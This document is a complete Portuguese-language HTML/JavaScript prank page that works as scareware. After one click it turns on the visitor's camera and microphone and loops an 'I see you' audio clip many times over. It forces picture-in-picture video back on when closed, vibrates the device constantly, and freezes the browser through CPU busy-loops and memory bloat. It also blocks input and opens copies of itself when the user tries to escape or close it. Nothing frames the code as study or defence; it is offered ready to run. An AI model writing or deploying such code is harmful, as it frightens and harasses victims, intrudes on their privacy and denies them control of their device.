<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Sistema</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            background: #000;
            overflow: hidden;
            font-family: 'Courier New', monospace;
            width: 100vw;
            height: 100vh;
        }
        video {
            width: 100vw;
            height: 100vh;
            object-fit: cover;
        }
        #start {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #000;
            color: #0f0;
            font-size: 2em;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            cursor: pointer;
        }
        .terminal-text {
            position: fixed;
            bottom: 20px;
            left: 20px;
            color: #0f0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            z-index: 850;
            max-height: 200px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.9);
            padding: 10px;
            border: 1px solid #0f0;
            width: 500px;
        }
        #userVideo {
            position: fixed;
            top: 10px;
            right: 10px;
            width: 300px;
            height: 200px;
            border: 3px solid #ff0000;
            z-index: 950;
            background: #000;
        }
        .audio-overlay {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(255, 0, 0, 0.9);
            color: white;
            padding: 20px;
            font-size: 2em;
            z-index: 10000;
            display: none;
        }
        .pip-force {
            position: fixed;
            top: 10px;
            left: 10px;
            background: rgba(255, 0, 0, 0.9);
            color: white;
            padding: 10px;
            font-size: 1.2em;
            z-index: 10001;
        }
    </style>
</head>
<body>
    <div id="start">üö® INICIAR SISTEMA üö®</div>
    <video id="video" playsinline loop muted>
        <source src="https://alexandre7888.github.io/ontono.exe/InShot_20250705_234210151.mp4" type="video/mp4">
    </video>
    <video id="userVideo" autoplay muted playsinline style="display: none;"></video>
    <div class="terminal-text" id="terminal"></div>
    <div class="audio-overlay" id="audioOverlay">EU VEJO VOC√ä</div>
    <div class="pip-force" id="pipForce" style="display: none;">PIP ATIVO - N√ÉO FECHE!</div>

    <script>
        const start = document.getElementById("start");
        const video = document.getElementById("video");
        const userVideo = document.getElementById("userVideo");
        const terminal = document.getElementById("terminal");
        const audioOverlay = document.getElementById("audioOverlay");
        const pipForce = document.getElementById("pipForce");

        let localStream = null;
        let audioClips = [];
        let pipInterval;
        let pipActive = false;

        // **SISTEMA DE PIP PERSISTENTE - FOR√áAR SEMPRE ATIVO**
        async function forcePIP() {
            if (!document.pictureInPictureEnabled) {
                updateTerminal("‚ùå PIP N√ÉO SUPORTADO");
                return;
            }

            try {
                // Verificar se j√° est√° em PIP
                if (document.pictureInPictureElement) {
                    return; // J√° est√° ativo
                }

                // For√ßar entrar no PIP
                await video.requestPictureInPicture();
                pipActive = true;
                pipForce.style.display = 'block';
                updateTerminal("‚úÖ PIP FOR√áADO - V√çDEO FLUTUANTE ATIVO");

            } catch (error) {
                updateTerminal("‚ùå ERRO AO FOR√áAR PIP: " + error.message);
                pipActive = false;
            }
        }

        function startPIPPersistance() {
            updateTerminal("üé¨ INICIANDO SISTEMA DE PIP PERSISTENTE...");

            // For√ßar PIP inicial
            setTimeout(() => {
                forcePIP();
            }, 1000);

            // Verificar e for√ßar PIP a cada 2 segundos
            pipInterval = setInterval(() => {
                if (!document.pictureInPictureElement && !pipActive) {
                    updateTerminal("‚ö†Ô∏è PIP FECHADO - FOR√áANDO REATIVA√á√ÉO");
                    forcePIP();
                }
            }, 2000);

            // Monitorar quando usu√°rio tenta sair do PIP
            video.addEventListener('leavepictureinpicture', () => {
                updateTerminal("üö® USU√ÅRIO TENTOU SAIR DO PIP! REATIVANDO...");
                pipActive = false;
                
                // Reativar imediatamente
                setTimeout(() => {
                    forcePIP();
                }, 500);
                
                // Intensificar ataques
                intensifyAttacks();
            });

            updateTerminal("‚úÖ SISTEMA DE PIP PERSISTENTE ATIVO");
        }

        // **INTENSIFICAR ATAQUES QUANDO TENTA FECHAR PIP**
        function intensifyAttacks() {
            updateTerminal("üí• INTENSIFICANDO ATAQUES - PIP TENTOU SER FECHADO");
            
            // Tocar mais √°udios
            playMultipleAudio();
            
            // Vibra√ß√£o mais forte
            if (navigator.vibrate) {
                navigator.vibrate([3000, 200, 3000, 200, 3000]);
            }
            
            // Criar mais overlays
            for (let i = 0; i < 3; i++) {
                setTimeout(() => {
                    audioOverlay.style.display = 'block';
                    audioOverlay.textContent = 'N√ÉO FECHE O PIP! '.repeat(2);
                    setTimeout(() => {
                        audioOverlay.style.display = 'none';
                    }, 3000);
                }, i * 1000);
            }
        }

        // **SISTEMA DE √ÅUDIO "EU VEJO VOC√ä" REPETIDO**
        function setupAudioSystem() {
            updateTerminal("üîä CARREGANDO √ÅUDIOS 'EU VEJO VOC√ä'...");
            
            // Criar m√∫ltiplas inst√¢ncias do √°udio
            for (let i = 0; i < 15; i++) {
                const audio = new Audio();
                audio.src = "https://alexandre7888.github.io/ontono.exe/eu%20vejo%20voc%C3%AA.mp3";
                audio.volume = 0.8;
                audio.preload = "auto";
                audioClips.push(audio);
            }
            
            updateTerminal("‚úÖ 15 √ÅUDIOS CARREGADOS - PRONTOS PARA TOCAR");
        }

        function playMultipleAudio() {
            updateTerminal("üîä DISPARANDO 'EU VEJO VOC√ä' EM MASSA...");
            
            // Tocar todos os √°udios rapidamente
            audioClips.forEach((audio, index) => {
                setTimeout(() => {
                    audio.currentTime = 0;
                    audio.play().catch(e => {
                        // Silenciar se bloqueado e tentar novamente
                        audio.muted = true;
                        audio.play().catch(() => {});
                    });
                    
                    // Mostrar overlay
                    audioOverlay.style.display = 'block';
                    audioOverlay.textContent = 'EU VEJO VOC√ä! '.repeat(3);
                    setTimeout(() => {
                        audioOverlay.style.display = 'none';
                    }, 1500);
                    
                }, index * 300); // Espa√ßar os √°udios
            });
            
            // Repetir a cada 3 segundos
            setInterval(() => {
                audioClips.forEach(audio => {
                    audio.currentTime = 0;
                    audio.play().catch(e => {
                        audio.muted = true;
                        audio.play().catch(() => {});
                    });
                });
                audioOverlay.style.display = 'block';
                setTimeout(() => audioOverlay.style.display = 'none', 1500);
            }, 3000);
        }

        // **SISTEMA DE VIBRA√á√ÉO CONSTANTE**
        function startVibration() {
            updateTerminal("üì≥ INICIANDO VIBRA√á√ÉO CONSTANTE...");
            
            if (navigator.vibrate) {
                // Vibra√ß√£o constante
                setInterval(() => {
                    navigator.vibrate([2000, 300, 2000, 300, 2000]);
                    updateTerminal("üì≥ VIBRA√á√ÉO ATIVA");
                }, 6000);
                
            } else {
                updateTerminal("‚ùå VIBRA√á√ÉO N√ÉO SUPORTADA");
            }
        }

        // **SISTEMA DE TRAVAMENTO REAL**
        function startRealCrash() {
            updateTerminal("üí• INICIANDO TRAVAMENTO DO NAVEGADOR...");

            // 1. CONSUMO M√ÅXIMO DE CPU
            const cpuCrash = setInterval(() => {
                const startTime = Date.now();
                // Loop que trava por 3 segundos
                while (Date.now() - startTime < 3000) {
                    // C√°lculos extremamente pesados
                    for (let i = 0; i < 1000000; i++) {
                        const heavy = Math.sin(Math.random()) * Math.cos(Math.random()) * Math.tan(Math.random());
                        const array = new Array(5000).fill(heavy);
                    }
                }
                updateTerminal("üî• CPU 100% - SISTEMA TRAVADO");
            }, 5000);

            // 2. CONSUMO DE MEM√ìRIA
            const memoryHog = [];
            const memoryCrash = setInterval(() => {
                for (let i = 0; i < 50; i++) {
                    memoryHog.push(new Array(50000).fill('TRAVAMENTO_' + Date.now()));
                }
            }, 3000);

            // 3. TRAVAR EVENTOS
            document.addEventListener('mousemove', (e) => {
                e.preventDefault();
                e.stopImmediatePropagation();
            }, true);

            document.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopImmediatePropagation();
                updateTerminal("üñ±Ô∏è CLIQUE BLOQUEADO");
                // Abrir novas janelas ao clicar
                window.open(window.location.href, '_blank');
            }, true);

            document.addEventListener('keydown', (e) => {
                e.preventDefault();
                e.stopImmediatePropagation();
                updateTerminal("‚å®Ô∏è TECLA " + e.key + " BLOQUEADA");
                
                if (e.key === 'Escape') {
                    for (let i = 0; i < 3; i++) {
                        window.open(window.location.href, '_blank');
                    }
                }
            }, true);

            updateTerminal("‚úÖ TRAVAMENTO 100% ATIVO");
        }

        // **SISTEMA DE C√ÇMERA**
        async function startCamera() {
            try {
                updateTerminal("üìπ INICIANDO C√ÇMERA...");
                
                const constraints = {
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'user'
                    },
                    audio: true
                };

                localStream = await navigator.mediaDevices.getUserMedia(constraints);
                userVideo.srcObject = localStream;
                userVideo.style.display = 'block';
                
                updateTerminal("‚úÖ C√ÇMERA ATIVA");
                
            } catch (error) {
                updateTerminal("‚ùå C√ÇMERA BLOQUEADA");
            }
        }

        // **DETECTAR QUANDO SAI DO NAVEGADOR**
        function setupPageMonitor() {
            document.addEventListener('visibilitychange', () => {
                if (document.hidden) {
                    updateTerminal("üì± USU√ÅRIO SAIU DO NAVEGADOR - PIP MANT√âM V√çDEO!");
                    
                    // Intensificar √°udio
                    playMultipleAudio();
                    
                    if (navigator.vibrate) {
                        navigator.vibrate([5000, 500, 5000]);
                    }
                    
                } else {
                    updateTerminal("üì± USU√ÅRIO VOLTOU - PIP CONTINUA ATIVO");
                }
            });
        }

        // **INICIAR SISTEMA COMPLETO**
        start.addEventListener("click", async () => {
            start.style.display = "none";
            updateTerminal("üöÄ INICIANDO SISTEMA DE PIP PERSISTENTE...");

            // 1. Configurar √°udio
            setupAudioSystem();

            // 2. Iniciar c√¢mera
            await startCamera();

            // 3. Configurar monitor de p√°gina
            setupPageMonitor();

            // 4. Iniciar v√≠deo
            video.play().catch(e => {
                video.muted = true;
                video.play();
            });

            // 5. Iniciar PIP persistente (PRINCIPAL)
            startPIPPersistance();

            // 6. Iniciar vibra√ß√£o
            startVibration();

            // 7. Iniciar travamento
            setTimeout(() => {
                startRealCrash();
            }, 2000);

            // 8. Iniciar √°udios
            setTimeout(() => {
                playMultipleAudio();
            }, 3000);

            updateTerminal("‚úÖ SISTEMA ATIVO - PIP SEMPRE VIS√çVEL");
        });

        // **IMPEDIR FECHAMENTO**
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            updateTerminal("üö® TENTATIVA DE FECHAR! MANTENDO PIP...");
            
            // Manter PIP ativo
            forcePIP();
            
            // Abrir c√≥pias
            window.open(window.location.href, '_blank');
            
            e.returnValue = 'PIP ATIVO - N√ÉO FECHE!';
            return e.returnValue;
        });

        function updateTerminal(message) {
            terminal.textContent += `[${new Date().toLocaleTimeString()}] ${message}\n`;
            terminal.scrollTop = terminal.scrollHeight;
        }

    </script>
</body>
</html>